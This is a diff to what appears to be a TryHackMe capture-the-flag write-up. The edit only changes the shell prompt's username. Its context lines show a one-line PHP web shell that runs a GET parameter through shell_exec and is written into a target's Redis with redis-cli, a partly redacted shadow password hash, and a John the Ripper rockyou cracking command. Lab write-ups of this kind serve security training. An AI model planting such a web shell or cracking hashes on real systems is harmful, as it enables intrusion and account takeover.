@@ -74,7 +74,7 @@ So we can see apache default page
 root@parrot  ~/Desktop/tryhackme/res  nano shell.php
 root@parrot  ~/Desktop/tryhackme/res  cat shell.php
 <?php echo shell_exec($_GET['e'].' 2>&1'); ?>
-argenestel@parrot  ~/Desktop/tryhackme/res  cat shell.php | redis-cli -h 10.10.79.132 -x set lkey
+root@parrot  ~/Desktop/tryhackme/res  cat shell.php | redis-cli -h 10.10.79.132 -x set lkey
 
 OK
 root@parrot  ~/Desktop/tryhackme/res  redis-cli -h 10.10.79.132
@@ -134,7 +134,7 @@ vianka:<redacted>c1/TuUOUBo/jWQaQtGSXwvri0:18507:0:99999:7:::
 ```
 
 ```bash
-Argenestel@parrot  ~/Desktop/tryhackme/res  john --wordlist=/usr/share/wordlists/rockyou.txt vianka.hash
+root@parrot  ~/Desktop/tryhackme/res  john --wordlist=/usr/share/wordlists/rockyou.txt vianka.hash
 Using default input encoding: UTF-8
 Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
 Cost 1 (iteration count) is 5000 for all loaded hashes
